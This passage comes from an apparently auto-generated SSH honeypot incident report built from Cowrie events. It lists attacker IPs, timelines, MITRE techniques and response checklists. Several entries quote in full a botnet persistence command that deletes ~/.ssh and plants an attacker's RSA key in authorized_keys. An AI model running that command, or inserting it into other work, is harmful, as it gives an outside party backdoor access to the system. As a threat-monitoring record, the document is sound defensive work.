| `2026-08-30 03:09:44` | `cowrie.session.file_download` |
| `2026-08-30 03:09:44` | `cowrie.log.closed` |
| `2026-08-30 03:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.180.109[.]243` to AbuseIPDB if not already reported
- [ ] Block `185.180.109[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f293224152ac

| Field | Detail |
|---|---|
| **Source IP** | `185.180.109[.]243` |
| **First Seen** | 2026-08-30 03:09 |
| **Last Seen** | 2026-08-30 03:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:09:44` | `cowrie.session.connect` |
| `2026-08-30 03:09:44` | `cowrie.client.version` |
| `2026-08-30 03:09:44` | `cowrie.client.kex` |
| `2026-08-30 03:09:45` | `cowrie.login.success` |
| `2026-08-30 03:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.180.109[.]243` to AbuseIPDB if not already reported
- [ ] Block `185.180.109[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8af331cb736

| Field | Detail |
|---|---|
| **Source IP** | `185.180.109[.]243` |
| **First Seen** | 2026-08-30 03:09 |
| **Last Seen** | 2026-08-30 03:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:09:45` | `cowrie.session.connect` |
| `2026-08-30 03:09:45` | `cowrie.client.version` |
| `2026-08-30 03:09:45` | `cowrie.client.kex` |
| `2026-08-30 03:09:45` | `cowrie.login.success` |
| `2026-08-30 03:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.180.109[.]243` to AbuseIPDB if not already reported
- [ ] Block `185.180.109[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-976f6c95f40e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-30 03:10 |
| **Last Seen** | 2026-08-30 03:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:10:55` | `cowrie.session.connect` |
| `2026-08-30 03:10:55` | `cowrie.client.version` |
| `2026-08-30 03:10:55` | `cowrie.client.kex` |
| `2026-08-30 03:10:55` | `cowrie.login.success` |
| `2026-08-30 03:10:55` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:10:55` | `cowrie.direct-tcpip.data` |
| `2026-08-30 03:10:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0f67b9c679b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 03:14 |
| **Last Seen** | 2026-08-30 03:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:14:50` | `cowrie.session.connect` |
| `2026-08-30 03:14:50` | `cowrie.client.version` |
| `2026-08-30 03:14:50` | `cowrie.client.kex` |
| `2026-08-30 03:14:51` | `cowrie.login.success` |
| `2026-08-30 03:14:51` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:14:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 03:14:51` | `cowrie.direct-tcpip.data` |
| `2026-08-30 03:14:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bda504f6485

| Field | Detail |
|---|---|
| **Source IP** | `107.155.56[.]52` |
| **First Seen** | 2026-08-30 03:16 |
| **Last Seen** | 2026-08-30 03:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:16:25` | `cowrie.session.connect` |
| `2026-08-30 03:16:25` | `cowrie.client.version` |
| `2026-08-30 03:16:25` | `cowrie.client.kex` |
| `2026-08-30 03:16:26` | `cowrie.login.success` |
| `2026-08-30 03:16:27` | `cowrie.session.params` |
| `2026-08-30 03:16:27` | `cowrie.command.input` |
| `2026-08-30 03:16:27` | `cowrie.command.failed` |
| `2026-08-30 03:16:27` | `cowrie.log.closed` |
| `2026-08-30 03:16:28` | `cowrie.session.params` |
| `2026-08-30 03:16:28` | `cowrie.command.input` |
| `2026-08-30 03:16:28` | `cowrie.session.file_download` |
| `2026-08-30 03:16:28` | `cowrie.log.closed` |
| `2026-08-30 03:16:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.155.56[.]52` to AbuseIPDB if not already reported
- [ ] Block `107.155.56[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a258842e5664

| Field | Detail |
|---|---|
| **Source IP** | `107.155.56[.]52` |
| **First Seen** | 2026-08-30 03:16 |
| **Last Seen** | 2026-08-30 03:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:16:29` | `cowrie.session.connect` |
| `2026-08-30 03:16:29` | `cowrie.client.version` |
| `2026-08-30 03:16:29` | `cowrie.client.kex` |
| `2026-08-30 03:16:30` | `cowrie.login.success` |
| `2026-08-30 03:16:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.155.56[.]52` to AbuseIPDB if not already reported
- [ ] Block `107.155.56[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-104867839dca

| Field | Detail |
|---|---|
| **Source IP** | `107.155.56[.]52` |
| **First Seen** | 2026-08-30 03:16 |
| **Last Seen** | 2026-08-30 03:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:16:30` | `cowrie.session.connect` |
| `2026-08-30 03:16:30` | `cowrie.client.version` |
| `2026-08-30 03:16:31` | `cowrie.client.kex` |
| `2026-08-30 03:16:32` | `cowrie.login.success` |
| `2026-08-30 03:16:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.155.56[.]52` to AbuseIPDB if not already reported
- [ ] Block `107.155.56[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbf18e6210ef

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 03:19 |
| **Last Seen** | 2026-08-30 03:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:19:15` | `cowrie.session.connect` |
| `2026-08-30 03:19:15` | `cowrie.client.version` |
| `2026-08-30 03:19:15` | `cowrie.client.kex` |
| `2026-08-30 03:19:16` | `cowrie.login.success` |
| `2026-08-30 03:19:16` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:19:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 03:19:17` | `cowrie.direct-tcpip.data` |
| `2026-08-30 03:19:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b091cc024733

| Field | Detail |
|---|---|
| **Source IP** | `27.107.102[.]154` |
| **First Seen** | 2026-08-30 03:20 |
| **Last Seen** | 2026-08-30 03:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:20:44` | `cowrie.session.connect` |
| `2026-08-30 03:20:44` | `cowrie.client.version` |
| `2026-08-30 03:20:44` | `cowrie.client.kex` |
| `2026-08-30 03:20:46` | `cowrie.login.success` |
| `2026-08-30 03:20:47` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:20:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.107.102[.]154` to AbuseIPDB if not already reported
- [ ] Block `27.107.102[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5e12989079f

| Field | Detail |
|---|---|
| **Source IP** | `2.249.150[.]53` |
| **First Seen** | 2026-08-30 03:20 |
| **Last Seen** | 2026-08-30 03:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:20:52` | `cowrie.session.connect` |
| `2026-08-30 03:20:53` | `cowrie.client.version` |
| `2026-08-30 03:20:53` | `cowrie.client.kex` |
| `2026-08-30 03:20:54` | `cowrie.login.success` |
| `2026-08-30 03:20:54` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:20:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.249.150[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.249.150[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9a2b7f52903

| Field | Detail |
|---|---|
| **Source IP** | `66.45.144[.]201` |
| **First Seen** | 2026-08-30 03:25 |
| **Last Seen** | 2026-08-30 03:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:25:17` | `cowrie.session.connect` |
| `2026-08-30 03:25:18` | `cowrie.client.version` |
| `2026-08-30 03:25:18` | `cowrie.client.kex` |
| `2026-08-30 03:25:19` | `cowrie.login.success` |
| `2026-08-30 03:25:19` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:25:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.45.144[.]201` to AbuseIPDB if not already reported
- [ ] Block `66.45.144[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47813df71280

| Field | Detail |
|---|---|
| **Source IP** | `106.245.246[.]26` |
| **First Seen** | 2026-08-30 03:25 |
| **Last Seen** | 2026-08-30 03:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:25:26` | `cowrie.session.connect` |
| `2026-08-30 03:25:26` | `cowrie.client.version` |
| `2026-08-30 03:25:26` | `cowrie.client.kex` |
| `2026-08-30 03:25:29` | `cowrie.login.success` |
| `2026-08-30 03:25:30` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:25:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.245.246[.]26` to AbuseIPDB if not already reported
- [ ] Block `106.245.246[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-567fd7fa61ba

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 03:25 |
| **Last Seen** | 2026-08-30 03:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:25:27` | `cowrie.session.connect` |
| `2026-08-30 03:25:27` | `cowrie.client.version` |
| `2026-08-30 03:25:27` | `cowrie.client.kex` |
| `2026-08-30 03:25:28` | `cowrie.login.success` |
| `2026-08-30 03:25:28` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:25:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 03:25:28` | `cowrie.direct-tcpip.data` |
| `2026-08-30 03:25:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d77b4b322004

| Field | Detail |
|---|---|
| **Source IP** | `104.248.83[.]99` |
| **First Seen** | 2026-08-30 03:25 |
| **Last Seen** | 2026-08-30 03:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:25:34` | `cowrie.session.connect` |
| `2026-08-30 03:25:35` | `cowrie.client.version` |
| `2026-08-30 03:25:35` | `cowrie.client.kex` |
| `2026-08-30 03:25:35` | `cowrie.login.success` |
| `2026-08-30 03:25:36` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:25:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.248.83[.]99` to AbuseIPDB if not already reported
- [ ] Block `104.248.83[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6eb65738a52

| Field | Detail |
|---|---|
| **Source IP** | `2.179.194[.]193` |
| **First Seen** | 2026-08-30 03:25 |
| **Last Seen** | 2026-08-30 03:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:25:41` | `cowrie.session.connect` |
| `2026-08-30 03:25:41` | `cowrie.client.version` |
| `2026-08-30 03:25:41` | `cowrie.client.kex` |
| `2026-08-30 03:25:43` | `cowrie.login.success` |
| `2026-08-30 03:25:44` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:25:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.179.194[.]193` to AbuseIPDB if not already reported
- [ ] Block `2.179.194[.]193` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a83a89ef36b1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 03:28 |
| **Last Seen** | 2026-08-30 03:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:28:45` | `cowrie.session.connect` |
| `2026-08-30 03:28:45` | `cowrie.client.version` |
| `2026-08-30 03:28:46` | `cowrie.client.kex` |
| `2026-08-30 03:28:46` | `cowrie.login.success` |
| `2026-08-30 03:28:47` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:28:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 03:28:47` | `cowrie.direct-tcpip.data` |
| `2026-08-30 03:28:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b5830d2480b

| Field | Detail |
|---|---|
| **Source IP** | `78.187.9[.]53` |
| **First Seen** | 2026-08-30 03:30 |
| **Last Seen** | 2026-08-30 03:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:30:21` | `cowrie.session.connect` |
| `2026-08-30 03:30:22` | `cowrie.client.version` |
| `2026-08-30 03:30:22` | `cowrie.client.kex` |
| `2026-08-30 03:30:23` | `cowrie.login.success` |
| `2026-08-30 03:30:23` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:30:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.9[.]53` to AbuseIPDB if not already reported
- [ ] Block `78.187.9[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76d2c93f998d

| Field | Detail |
|---|---|
| **Source IP** | `222.92.61[.]242` |
| **First Seen** | 2026-08-30 03:30 |
| **Last Seen** | 2026-08-30 03:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:30:28` | `cowrie.session.connect` |
| `2026-08-30 03:30:29` | `cowrie.client.version` |
| `2026-08-30 03:30:29` | `cowrie.client.kex` |
| `2026-08-30 03:30:32` | `cowrie.login.success` |
| `2026-08-30 03:30:32` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:30:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.92.61[.]242` to AbuseIPDB if not already reported
- [ ] Block `222.92.61[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c290ecc68cf9

| Field | Detail |
|---|---|
| **Source IP** | `117.50.176[.]93` |
| **First Seen** | 2026-08-30 03:30 |
| **Last Seen** | 2026-08-30 03:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:30:46` | `cowrie.session.connect` |
| `2026-08-30 03:30:46` | `cowrie.client.version` |
| `2026-08-30 03:30:46` | `cowrie.client.kex` |
| `2026-08-30 03:30:47` | `cowrie.login.success` |
| `2026-08-30 03:30:48` | `cowrie.session.params` |
| `2026-08-30 03:30:48` | `cowrie.command.input` |
| `2026-08-30 03:30:48` | `cowrie.log.closed` |
| `2026-08-30 03:30:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.50.176[.]93` to AbuseIPDB if not already reported
- [ ] Block `117.50.176[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6f49b712b07

| Field | Detail |
|---|---|
| **Source IP** | `157.15.67[.]253` |
| **First Seen** | 2026-08-30 03:30 |
| **Last Seen** | 2026-08-30 03:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:30:48` | `cowrie.session.connect` |
| `2026-08-30 03:30:48` | `cowrie.client.version` |
| `2026-08-30 03:30:48` | `cowrie.client.kex` |
| `2026-08-30 03:30:49` | `cowrie.login.success` |
| `2026-08-30 03:30:50` | `cowrie.session.params` |
| `2026-08-30 03:30:50` | `cowrie.command.input` |
| `2026-08-30 03:30:50` | `cowrie.command.failed` |
| `2026-08-30 03:30:51` | `cowrie.log.closed` |
| `2026-08-30 03:30:51` | `cowrie.session.params` |
| `2026-08-30 03:30:51` | `cowrie.command.input` |
| `2026-08-30 03:30:52` | `cowrie.session.file_download` |
| `2026-08-30 03:30:52` | `cowrie.log.closed` |
| `2026-08-30 03:30:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.15.67[.]253` to AbuseIPDB if not already reported
- [ ] Block `157.15.67[.]253` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28ecbf340894

| Field | Detail |
|---|---|
| **Source IP** | `157.15.67[.]253` |
| **First Seen** | 2026-08-30 03:30 |
| **Last Seen** | 2026-08-30 03:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:30:52` | `cowrie.session.connect` |
| `2026-08-30 03:30:52` | `cowrie.client.version` |
| `2026-08-30 03:30:52` | `cowrie.client.kex` |
| `2026-08-30 03:30:53` | `cowrie.login.success` |
| `2026-08-30 03:30:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.15.67[.]253` to AbuseIPDB if not already reported
- [ ] Block `157.15.67[.]253` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1bc38026681

| Field | Detail |
|---|---|
| **Source IP** | `157.15.67[.]253` |
| **First Seen** | 2026-08-30 03:30 |
| **Last Seen** | 2026-08-30 03:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:30:54` | `cowrie.session.connect` |
| `2026-08-30 03:30:54` | `cowrie.client.version` |
| `2026-08-30 03:30:54` | `cowrie.client.kex` |
| `2026-08-30 03:30:55` | `cowrie.login.success` |
| `2026-08-30 03:30:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.15.67[.]253` to AbuseIPDB if not already reported
- [ ] Block `157.15.67[.]253` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-840b77e4d687

| Field | Detail |
|---|---|
| **Source IP** | `156.236.73[.]11` |
| **First Seen** | 2026-08-30 03:31 |
| **Last Seen** | 2026-08-30 03:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:31:35` | `cowrie.session.connect` |
| `2026-08-30 03:31:35` | `cowrie.client.version` |
| `2026-08-30 03:31:35` | `cowrie.client.kex` |
| `2026-08-30 03:31:36` | `cowrie.login.success` |
| `2026-08-30 03:31:37` | `cowrie.session.params` |
| `2026-08-30 03:31:37` | `cowrie.command.input` |
